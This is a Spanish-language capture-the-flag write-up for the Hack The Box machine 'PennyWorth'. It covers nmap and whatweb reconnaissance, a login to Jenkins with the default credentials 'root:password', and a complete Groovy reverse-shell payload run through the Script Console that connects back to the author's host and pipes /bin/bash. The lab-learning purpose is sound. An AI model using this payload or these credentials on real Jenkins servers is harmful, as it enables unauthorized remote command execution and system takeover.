---
title: PennyWorth
layout: page
permalink: /HTB_PennyWorth
---

<h2 class="amarillo">PennyWorth</h2>
<div id="imgs" style="text-align: center;">
  <img src="/assets/images/StartingPoint/VIP/PennyWorth/pennyworth.png" alt="under" oncontextmenu="return false;">
</div>

Comenzamos encendiendo la máquina y obtenemos la dirección IP 10.129.245.27, le enviaremos un paquete con ping para saber si la máquina está encendida.

```bash
❯ ping -c 5 10.129.245.27
PING 10.129.245.27 (10.129.245.27) 56(84) bytes of data.
64 bytes from 10.129.245.27: icmp_seq=1 ttl=63 time=1204 ms
64 bytes from 10.129.245.27: icmp_seq=2 ttl=63 time=286 ms
64 bytes from 10.129.245.27: icmp_seq=3 ttl=63 time=120 ms
64 bytes from 10.129.245.27: icmp_seq=4 ttl=63 time=120 ms
64 bytes from 10.129.245.27: icmp_seq=5 ttl=63 time=1865 ms
--- 10.129.245.27 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4040ms
rtt min/avg/max/mdev = 120.039/719.062/1864.712/700.349 ms, pipe 2
```

Vemos un TTL de 63, así que estamos frente a una máquina Linux.
<h2 class="amarillo">Enumeración</h2>

Comenzamos haciendo un escaneo rápido y sigiloso usando nmap para enumerar todo el rango de puertos en busca de servicios expuestos:

```bash
nmap -p --open -sS --min-rate 5000 -vvv -n -Pn 10.129.245.27 -oG allPorts
```
<div style="text-align: center;">
  <img src="/assets/images/StartingPoint/VIP/PennyWorth/namp.png" alt="under" oncontextmenu="return false;">
</div>

Vemos un único puerto abierto `8080` que lo normal es que sea un servicio web. Para saber un poco más de información lanzamos un escaneo exhaustivo para identificar la versión y servicio con nmap para este puerto usando una serie de scripts básicos de reconocimiento:

```bash
nmap -sCV -p8080 10.129.245.27 -oN targeted
```
<div style="text-align: center;">
  <img src="/assets/images/StartingPoint/VIP/PennyWorth/nmap2.png" alt="under" oncontextmenu="return false;">
</div>

No hay mucha información, pero siempre viene bien probar con la herramienta `whatweb`

```bash
whatweb 10.129.245.27:8080
```
<div style="text-align: center;">
  <img src="/assets/images/StartingPoint/VIP/PennyWorth/whatweb.png" alt="under" oncontextmenu="return false;">
</div>

<h2 class="amarillo">Explotación</h2>

Whatweb nos revela información más interesante como `Jenkins 2.289.1` , `Jetty 9.4.39.v20210325` y una ruta 'login?from=2F'. Así que probamos acceder a la web:
<div style="text-align: center;">
  <img src="/assets/images/StartingPoint/VIP/PennyWorth/web.png" alt="under" oncontextmenu="return false;">
</div>

Por defecto nos va a decir error ya que debemos proporcionar el puerto `8080` en la URL.
<div style="text-align: center;">
  <img src="/assets/images/StartingPoint/VIP/PennyWorth/web2.png" alt="under" oncontextmenu="return false;">
</div>

Aun proporcionando el puerto donde esta el servicio web tenemos problemas, entonces pondremos la URL encontrada por whatweb.
<div style="text-align: center;">
  <img src="/assets/images/StartingPoint/VIP/PennyWorth/login.png" alt="under" oncontextmenu="return false;">
</div>

Nos encontramos con un panel de Login, y al saber ya la version y servicio ejecutados en la máquina encontramos que tiene unas cuantas vulnerabilidades.
<div style="text-align: center;">
  <img src="/assets/images/StartingPoint/VIP/PennyWorth/jetty.png" alt="under" oncontextmenu="return false;">
</div>

Dentro de estas se encuentra que las credenciales del panel de Login es 'root:password'.
<div style="text-align: center;">
  <img src="/assets/images/StartingPoint/VIP/PennyWorth/intrusionweb.png" alt="under" oncontextmenu="return false;">
</div>

Una vez logueados encontramos `Groovy Script` y que podemos escribir nuestros propios códigos.
<div style="text-align: center;">
  <img src="/assets/images/StartingPoint/VIP/PennyWorth/intrusionweb2.png" alt="under" oncontextmenu="return false;">
</div>

En el siguiente <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">enlace</a> podemos encontrar algunos payloads:

**Groovy Payload**
```groovy
String host="10.10.16.84";
int port=443;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed())
{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());whi
le(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try
{p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
<div style="text-align: center;">
  <img src="/assets/images/StartingPoint/VIP/PennyWorth/web3.png" alt="under" oncontextmenu="return false;">
</div>

Podemos ver que los payloads son ejecutados por el Administrator y los ejecuta el Servidor. Probamos a cargar nuestro payload:
<div style="text-align: center;">
  <img src="/assets/images/StartingPoint/VIP/PennyWorth/revshell.png" alt="under" oncontextmenu="return false;">
</div>

Y nos ponemos en escucha con `nc` y recibimos una shell:
<div style="text-align: center;">
  <img src="/assets/images/StartingPoint/VIP/PennyWorth/metidos.png" alt="under" oncontextmenu="return false;">
</div>

Buscamos la flag y habremos completado la máquina.
<div style="text-align: center;">
  <img src="/assets/images/StartingPoint/VIP/PennyWorth/flag.png" alt="under" oncontextmenu="return false;">
</div>
<div style="text-align: center;">
  <img src="/assets/images/StartingPoint/VIP/PennyWorth/pwn.png" alt="under" oncontextmenu="return false;">
</div>
---

Esta publicación ha sido creada como soporte en mi formación académica y crecimiento profesional.

© Juan David Garcia Acevedo (aka liandd)
